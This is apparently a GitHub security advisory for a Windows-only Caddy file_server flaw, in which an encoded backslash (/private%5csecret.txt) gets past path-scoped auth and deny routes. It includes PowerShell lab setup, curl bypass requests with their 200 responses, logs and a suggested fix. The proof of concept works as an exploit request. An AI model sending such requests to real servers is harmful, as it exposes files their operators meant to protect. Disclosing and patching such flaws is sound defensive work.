# [H] Caddy: Windows `file_server` path authorization bypass via encoded backslash

## Summary
Severity: High
Advisory: GHSA-qrp7-cvwr-j2c6
CVE: CVE-2026-52844
CWE: CWE-22, CWE-284
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-06-16
Source: https://github.com/advisories/GHSA-qrp7-cvwr-j2c6
Type: github-advisory

## Affected
- Go: `github.com/caddyserver/caddy/v2` — affected >=0 <2.11.4
- Go: `github.com/caddyserver/caddy` — affected >=0

## Details
### Summary

On Windows, Caddy `path` matchers treat `/private\secret.txt` as outside `/private/*`, but `file_server` later resolves the same request path as `private\secret.txt` on disk.

An unauthenticated remote client can request `/private%5csecret.txt` and bypass Caddy path-scoped auth/deny routes protecting `/private/*`.

### Details

The mismatch is between two Caddy code paths:

- `MatchPath.MatchWithError()` compares `r.URL.Path` using URL path semantics and does not normalize `\` to `/`: `modules/caddyhttp/matchers.go:429`, `:436`, `:490`, `:532`.
- If the route matcher misses, Caddy skips that route: `modules/caddyhttp/routes.go:271`.
- `file_server` then maps the same request path to a filesystem path with `SanitizedPathJoin(root, r.URL.Path)`: `modules/caddyhttp/fileserver/staticfiles.go:294`, `modules/caddyhttp/caddyhttp.go:257`, `:263`.
- On Windows, Go filesystem path handling treats `\` as a separator, so the default filesystem opens the file under the protected directory: `internal/filesystems/os.go:18`.

This is related to, but distinct from, `GHSA-4xrr-hq4w-6vf4 / CVE-2026-27585`. That advisory fixed backslash handling in the `file` matcher / `try_files` glob path. This report does not use `try_files` or the `file` matcher; it affects ordinary `path` route matchers in front of direct `file_server` serving and reproduces on current HEAD.

### PoC

Tested on current HEAD `6c675e29f87cbe7326983ddb6d739175119d394c` with a Windows `caddy.exe` built from this repository.

On Windows, create the test files and Caddyfile:

```powershell
$base = "C:\Users\Public\caddy-backslash-poc"
Remove-Item -Recurse -Force $base -ErrorAction SilentlyContinue
New-Item -ItemType Directory -Force "$base\www\private" | Out-Null
Set-Content -Path "$base\www\private\secret.txt" -Value "SECRET_FROM_WINDOWS_LAB" -NoNewline -Encoding ASCII

@'
{
	debug
	admin off
	auto_https off
}

:19080 {
	log
	root * C:\Users\Public\caddy-backslash-poc\www

	@private path /private/*
	respond @private 403

	file_server
}
'@ | Set-Content -Path "$base\Caddyfile" -Encoding ASCII
```

Start Caddy:

```powershell
cd C:\Users\Public\caddy-backslash-poc
.\caddy.exe run --config Caddyfile --adapter caddyfile
```

Baseline request, expected to be blocked:

```bash
curl -v --path-as-is http://<windows-host>:19080/private/secret.txt
```

Observed:

```text
> GET /private/secret.txt HTTP/1.1
< HTTP/1.1 403 Forbidden
```

Bypass request:

```bash
curl -v --path-as-is 'http://<windows-host>:19080/private%5csecret.txt'
```

Observed:

```text
> GET /private%5csecret.txt HTTP/1.1
< HTTP/1.1 200 OK
< Content-Length: 23

SECRET_FROM_WINDOWS_LAB
```

Uppercase `%5C` produces the same result.

Relevant debug log lines:

```json
{"msg":"using config from file","file":"C:\\Users\\Public\\caddy-backslash-poc\\Caddyfile"}
{"logger":"http.log","msg":"server running","name":"srv0","protocols":["h1","h2","h3"]}
{"logger":"http.log.access","request":{"method":"GET","uri":"/private/secret.txt"},"status":403}
{"logger":"http.log.access","request":{"method":"GET","uri":"/private%5csecret.txt"},"status":200}
```

### Impact

This is a Windows-only remote authorization bypass for deployments that protect static subtrees with Caddy path matchers before `file_server`.

This pattern is documented by Caddy itself, for example `basic_auth /secret/* { ... }` followed by `file_server`.

An attacker can read files that were intended to be protected by Caddy-side `basic_auth`, `respond 403`, or other path-scoped handlers. The issue does not escape the configured site root; `..%5c` traversal is still blocked. The practical impact is sensitive file disclosure inside the protected subtree, with higher impact if that subtree contains backups, database files, exported admin data, credentials, or signing/session secrets.

### Suggested Fix

Normalize Windows path separators consistently before `MatchPath` evaluates request paths, or reject request paths containing `\` before `file_server` resolves them as filesystem separators.

The important invariant is that a request path used for route authorization must not later resolve to a different protected filesystem path.

### AI Disclosure

LLM assistance was used for codebase analysis and report drafting. The PoC was manually validated, including an end-to-end reproduction on a Windows Server lab host using a Windows `caddy.exe` built from current HEAD.

## References
- https://github.com/caddyserver/caddy/security/advisories/GHSA-qrp7-cvwr-j2c6
- https://nvd.nist.gov/vuln/detail/CVE-2026-52844
- https://github.com/caddyserver/caddy
